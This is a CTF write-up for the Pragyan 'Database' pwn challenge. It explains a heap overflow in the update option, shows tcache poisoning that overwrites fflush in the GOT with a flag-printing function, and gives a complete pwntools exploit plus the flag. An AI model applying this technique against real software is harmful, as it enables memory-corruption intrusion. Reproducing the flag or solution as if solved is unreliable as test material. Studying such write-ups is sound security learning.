# Database

## Challenge

We're given a binary with full mitigations except for RELRO, which is disabled.
We're also given the libc and linker used by the server, which is on version 2.27.

We are greeting by the following menu:

```
-> % ./database 
 ____        _        ____
|  _ \  __ _| |_ __ _| __ )  __ _ ___  ___ 
| | | |/ _` | __/ _` |  _ \ / _` / __|/ _ \
| |_| | (_| | || (_| | |_) | (_| \__ \  __/
|____/ \__,_|\__\__,_|____/ \__,_|___/\___|

Welcome to MY DataBase!
You can store as many as 0x10 strings!!!
This might help: 0xee89b201275
You have following options
+-----------------------------+
| 1. Show all data            |
| 2. Insert a element         |
| 3. Update a element         |
| 4. Remove a element         |
| 5. Exit                     |
+-----------------------------+
Enter your choice =>
```

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## Solution

The address printed at the start is the address of the `main` function, effectively nullifying PIE.

There is a heap overflow vulnerability, as we are allowed to enter an arbitrary size of bytes when updating an item, regardless of what the original size was.
We can use this to overwrite pointers in a freed chunk by updating a chunk at a lower address.

Using this vulnerability, we can overwrite the pointers with an address on the GOT.
RELRO is disabled, so by allocating a chunk on the GOT, we can overwrite function pointers.

There is a `secret` function that reads the flag:

```c
void sym.secret(void) {
    sym.imp.system("/bin/cat ./flag");
    return;
}
```

By overwriting a function on the GOT with this `secret` function, we can read the flag.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host binary.challs.pragyanctf.tech --port 6004 database
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('database')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'binary.challs.pragyanctf.tech'
port = int(args.PORT or 6004)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

io.recvuntil(b"This might help: ")
exe.address = int(io.recvuntil(b"\n", drop=True), 0) - exe.sym['main']

io.sendlineafter(b"Enter your choice => ", b"2")
io.sendlineafter(b"Please enter the length of string => ", b"16")
io.sendlineafter(b"Please enter the string you want to save => ", b"deadbeef")

io.sendlineafter(b"Enter your choice => ", b"2")
io.sendlineafter(b"Please enter the length of string => ", b"16")
io.sendlineafter(b"Please enter the string you want to save => ", b"deadbeef")

io.sendlineafter(b"Enter your choice => ", b"4")
io.sendlineafter(b"Please enter the index of element => ", b"1")

io.sendlineafter(b"Enter your choice => ", b"3")
io.sendlineafter(b"Please enter the index of element => ", b"0")
io.sendlineafter(b"Please enter the length of string => ", b"1000")
io.sendlineafter(b"Please enter the string => ", flat({0x20: exe.got['fflush']}))

io.sendlineafter(b"Enter your choice => ", b"2")
io.sendlineafter(b"Please enter the length of string => ", b"16")
io.sendlineafter(b"Please enter the string you want to save => ", b"deadbeef")

io.sendlineafter(b"Enter your choice => ", b"2")
io.sendlineafter(b"Please enter the length of string => ", b"16")
io.sendlineafter(b"Please enter the string you want to save => ", pack(exe.sym['secret']))

io.interactive()
```

## Flag

```
p_ctf{Ch4Ng3_1T_t0_M4x1Mum}
```
